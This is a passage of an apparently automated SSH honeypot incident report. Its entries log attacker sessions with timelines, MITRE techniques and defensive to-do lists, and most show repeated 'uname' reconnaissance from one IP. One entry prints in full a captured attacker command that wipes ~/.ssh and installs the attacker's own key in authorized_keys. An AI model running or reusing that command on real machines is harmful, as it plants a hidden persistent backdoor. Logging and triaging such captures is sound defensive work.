| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:20:35` | `cowrie.session.connect` |
| `2026-09-24 16:20:35` | `cowrie.client.version` |
| `2026-09-24 16:20:35` | `cowrie.client.kex` |
| `2026-09-24 16:20:36` | `cowrie.login.success` |
| `2026-09-24 16:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ce791cb8dd

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-09-24 16:20 |
| **Last Seen** | 2026-09-24 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:20:36` | `cowrie.session.connect` |
| `2026-09-24 16:20:36` | `cowrie.client.version` |
| `2026-09-24 16:20:37` | `cowrie.client.kex` |
| `2026-09-24 16:20:37` | `cowrie.login.success` |
| `2026-09-24 16:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e41ac44a11a8

| Field | Detail |
|---|---|
| **Source IP** | `218.78.64[.]229` |
| **First Seen** | 2026-09-24 16:27 |
| **Last Seen** | 2026-09-24 16:32 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:27:00` | `cowrie.session.connect` |
| `2026-09-24 16:27:01` | `cowrie.client.version` |
| `2026-09-24 16:27:01` | `cowrie.client.kex` |
| `2026-09-24 16:27:02` | `cowrie.login.success` |
| `2026-09-24 16:27:03` | `cowrie.session.params` |
| `2026-09-24 16:27:03` | `cowrie.command.input` |
| `2026-09-24 16:27:03` | `cowrie.command.failed` |
| `2026-09-24 16:27:03` | `cowrie.log.closed` |
| `2026-09-24 16:27:04` | `cowrie.session.params` |
| `2026-09-24 16:27:04` | `cowrie.command.input` |
| `2026-09-24 16:27:05` | `cowrie.session.file_download` |
| `2026-09-24 16:27:05` | `cowrie.log.closed` |
| `2026-09-24 16:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.64[.]229` to AbuseIPDB if not already reported
- [ ] Block `218.78.64[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9891f24c3a11

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:23` | `cowrie.session.connect` |
| `2026-09-24 16:31:23` | `cowrie.client.version` |
| `2026-09-24 16:31:23` | `cowrie.client.kex` |
| `2026-09-24 16:31:24` | `cowrie.login.success` |
| `2026-09-24 16:31:25` | `cowrie.session.params` |
| `2026-09-24 16:31:25` | `cowrie.command.input` |
| `2026-09-24 16:31:25` | `cowrie.log.closed` |
| `2026-09-24 16:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0b187efbe0

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:24` | `cowrie.session.connect` |
| `2026-09-24 16:31:24` | `cowrie.client.version` |
| `2026-09-24 16:31:24` | `cowrie.client.kex` |
| `2026-09-24 16:31:25` | `cowrie.login.success` |
| `2026-09-24 16:31:26` | `cowrie.session.params` |
| `2026-09-24 16:31:26` | `cowrie.command.input` |
| `2026-09-24 16:31:26` | `cowrie.log.closed` |
| `2026-09-24 16:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b657b046da4

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:25` | `cowrie.session.connect` |
| `2026-09-24 16:31:25` | `cowrie.client.version` |
| `2026-09-24 16:31:25` | `cowrie.client.kex` |
| `2026-09-24 16:31:26` | `cowrie.login.success` |
| `2026-09-24 16:31:27` | `cowrie.session.params` |
| `2026-09-24 16:31:27` | `cowrie.command.input` |
| `2026-09-24 16:31:27` | `cowrie.log.closed` |
| `2026-09-24 16:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98a05c298410

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:26` | `cowrie.session.connect` |
| `2026-09-24 16:31:26` | `cowrie.client.version` |
| `2026-09-24 16:31:26` | `cowrie.client.kex` |
| `2026-09-24 16:31:27` | `cowrie.login.success` |
| `2026-09-24 16:31:28` | `cowrie.session.params` |
| `2026-09-24 16:31:28` | `cowrie.command.input` |
| `2026-09-24 16:31:29` | `cowrie.log.closed` |
| `2026-09-24 16:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af28b52e201

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:26` | `cowrie.session.connect` |
| `2026-09-24 16:31:26` | `cowrie.client.version` |
| `2026-09-24 16:31:27` | `cowrie.client.kex` |
| `2026-09-24 16:31:27` | `cowrie.login.success` |
| `2026-09-24 16:31:29` | `cowrie.session.params` |
| `2026-09-24 16:31:29` | `cowrie.command.input` |
| `2026-09-24 16:31:29` | `cowrie.log.closed` |
| `2026-09-24 16:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba3bd3c576ef

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:27` | `cowrie.session.connect` |
| `2026-09-24 16:31:27` | `cowrie.client.version` |
| `2026-09-24 16:31:27` | `cowrie.client.kex` |
| `2026-09-24 16:31:28` | `cowrie.login.success` |
| `2026-09-24 16:31:30` | `cowrie.session.params` |
| `2026-09-24 16:31:30` | `cowrie.command.input` |
| `2026-09-24 16:31:30` | `cowrie.log.closed` |
| `2026-09-24 16:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02242623236f

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:28` | `cowrie.session.connect` |
| `2026-09-24 16:31:29` | `cowrie.client.version` |
| `2026-09-24 16:31:29` | `cowrie.client.kex` |
| `2026-09-24 16:31:30` | `cowrie.login.success` |
| `2026-09-24 16:31:31` | `cowrie.session.params` |
| `2026-09-24 16:31:31` | `cowrie.command.input` |
| `2026-09-24 16:31:32` | `cowrie.log.closed` |
| `2026-09-24 16:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9efae69bcff

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:29` | `cowrie.session.connect` |
| `2026-09-24 16:31:29` | `cowrie.client.version` |
| `2026-09-24 16:31:29` | `cowrie.client.kex` |
| `2026-09-24 16:31:30` | `cowrie.login.success` |
| `2026-09-24 16:31:32` | `cowrie.session.params` |
| `2026-09-24 16:31:32` | `cowrie.command.input` |
| `2026-09-24 16:31:32` | `cowrie.log.closed` |
| `2026-09-24 16:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a458d066336b

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:30` | `cowrie.session.connect` |
| `2026-09-24 16:31:30` | `cowrie.client.version` |
| `2026-09-24 16:31:30` | `cowrie.client.kex` |
| `2026-09-24 16:31:31` | `cowrie.login.success` |
| `2026-09-24 16:31:33` | `cowrie.session.params` |
| `2026-09-24 16:31:33` | `cowrie.command.input` |
| `2026-09-24 16:31:33` | `cowrie.log.closed` |
| `2026-09-24 16:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8b66131b84

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:30` | `cowrie.session.connect` |
| `2026-09-24 16:31:30` | `cowrie.client.version` |
| `2026-09-24 16:31:30` | `cowrie.client.kex` |
| `2026-09-24 16:31:32` | `cowrie.login.success` |
| `2026-09-24 16:31:33` | `cowrie.session.params` |
| `2026-09-24 16:31:33` | `cowrie.command.input` |
| `2026-09-24 16:31:33` | `cowrie.log.closed` |
| `2026-09-24 16:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f452740052a

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:32` | `cowrie.session.connect` |
| `2026-09-24 16:31:32` | `cowrie.client.version` |
| `2026-09-24 16:31:32` | `cowrie.client.kex` |
| `2026-09-24 16:31:34` | `cowrie.login.success` |
| `2026-09-24 16:31:35` | `cowrie.session.params` |
| `2026-09-24 16:31:35` | `cowrie.command.input` |
| `2026-09-24 16:31:36` | `cowrie.log.closed` |
| `2026-09-24 16:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd83d06d9e91

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:32` | `cowrie.session.connect` |
| `2026-09-24 16:31:32` | `cowrie.client.version` |
| `2026-09-24 16:31:32` | `cowrie.client.kex` |
| `2026-09-24 16:31:34` | `cowrie.login.success` |
| `2026-09-24 16:31:35` | `cowrie.session.params` |
| `2026-09-24 16:31:35` | `cowrie.command.input` |
| `2026-09-24 16:31:35` | `cowrie.log.closed` |
| `2026-09-24 16:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a94208c721

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:33` | `cowrie.session.connect` |
| `2026-09-24 16:31:33` | `cowrie.client.version` |
| `2026-09-24 16:31:33` | `cowrie.client.kex` |
| `2026-09-24 16:31:34` | `cowrie.login.success` |
| `2026-09-24 16:31:36` | `cowrie.session.params` |
| `2026-09-24 16:31:36` | `cowrie.command.input` |
| `2026-09-24 16:31:36` | `cowrie.log.closed` |
| `2026-09-24 16:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-268e724319fd

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:33` | `cowrie.session.connect` |
| `2026-09-24 16:31:33` | `cowrie.client.version` |
| `2026-09-24 16:31:33` | `cowrie.client.kex` |
| `2026-09-24 16:31:35` | `cowrie.login.success` |
| `2026-09-24 16:31:37` | `cowrie.session.params` |
| `2026-09-24 16:31:37` | `cowrie.command.input` |
| `2026-09-24 16:31:37` | `cowrie.log.closed` |
| `2026-09-24 16:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899b1f39432e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:34` | `cowrie.session.connect` |
| `2026-09-24 16:31:34` | `cowrie.client.version` |
| `2026-09-24 16:31:34` | `cowrie.client.kex` |
| `2026-09-24 16:31:37` | `cowrie.login.success` |
| `2026-09-24 16:31:38` | `cowrie.session.params` |
| `2026-09-24 16:31:38` | `cowrie.command.input` |
| `2026-09-24 16:31:38` | `cowrie.log.closed` |
| `2026-09-24 16:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b4af313c96

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:35` | `cowrie.session.connect` |
| `2026-09-24 16:31:35` | `cowrie.client.version` |
| `2026-09-24 16:31:36` | `cowrie.client.kex` |
| `2026-09-24 16:31:38` | `cowrie.login.success` |
| `2026-09-24 16:31:39` | `cowrie.session.params` |
| `2026-09-24 16:31:39` | `cowrie.command.input` |
| `2026-09-24 16:31:39` | `cowrie.log.closed` |
| `2026-09-24 16:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df20543edae3

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:35` | `cowrie.session.connect` |
| `2026-09-24 16:31:35` | `cowrie.client.version` |
| `2026-09-24 16:31:36` | `cowrie.client.kex` |
| `2026-09-24 16:31:38` | `cowrie.login.success` |
| `2026-09-24 16:31:39` | `cowrie.session.params` |
| `2026-09-24 16:31:39` | `cowrie.command.input` |
| `2026-09-24 16:31:40` | `cowrie.log.closed` |
| `2026-09-24 16:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf38aceab99

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:36` | `cowrie.session.connect` |
| `2026-09-24 16:31:36` | `cowrie.client.version` |
| `2026-09-24 16:31:37` | `cowrie.client.kex` |
| `2026-09-24 16:31:38` | `cowrie.login.success` |
| `2026-09-24 16:31:40` | `cowrie.session.params` |
| `2026-09-24 16:31:40` | `cowrie.command.input` |
| `2026-09-24 16:31:41` | `cowrie.log.closed` |
| `2026-09-24 16:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83152028747a

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:37` | `cowrie.session.connect` |
| `2026-09-24 16:31:37` | `cowrie.client.version` |
| `2026-09-24 16:31:37` | `cowrie.client.kex` |
| `2026-09-24 16:31:39` | `cowrie.login.success` |
| `2026-09-24 16:31:41` | `cowrie.session.params` |
| `2026-09-24 16:31:41` | `cowrie.command.input` |
| `2026-09-24 16:31:41` | `cowrie.log.closed` |
| `2026-09-24 16:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f62fff257d7

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:38` | `cowrie.session.connect` |
| `2026-09-24 16:31:38` | `cowrie.client.version` |
| `2026-09-24 16:31:38` | `cowrie.client.kex` |
| `2026-09-24 16:31:41` | `cowrie.login.success` |
| `2026-09-24 16:31:42` | `cowrie.session.params` |
| `2026-09-24 16:31:42` | `cowrie.command.input` |
| `2026-09-24 16:31:42` | `cowrie.log.closed` |
| `2026-09-24 16:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28fc96598a3a

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:38` | `cowrie.session.connect` |
| `2026-09-24 16:31:38` | `cowrie.client.version` |
| `2026-09-24 16:31:38` | `cowrie.client.kex` |
| `2026-09-24 16:31:41` | `cowrie.login.success` |
| `2026-09-24 16:31:43` | `cowrie.session.params` |
| `2026-09-24 16:31:43` | `cowrie.command.input` |
| `2026-09-24 16:31:44` | `cowrie.log.closed` |
| `2026-09-24 16:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4cd338c46e9

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:31 |
| **Last Seen** | 2026-09-24 16:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:31:39` | `cowrie.session.connect` |
| `2026-09-24 16:31:39` | `cowrie.client.version` |
| `2026-09-24 16:31:40` | `cowrie.client.kex` |
| `2026-09-24 16:31:42` | `cowrie.login.success` |
| `2026-09-24 16:31:43` | `cowrie.session.params` |
| `2026-09-24 16:31:43` | `cowrie.command.input` |
| `2026-09-24 16:31:44` | `cowrie.log.closed` |
| `2026-09-24 16:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf91a258c0d

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
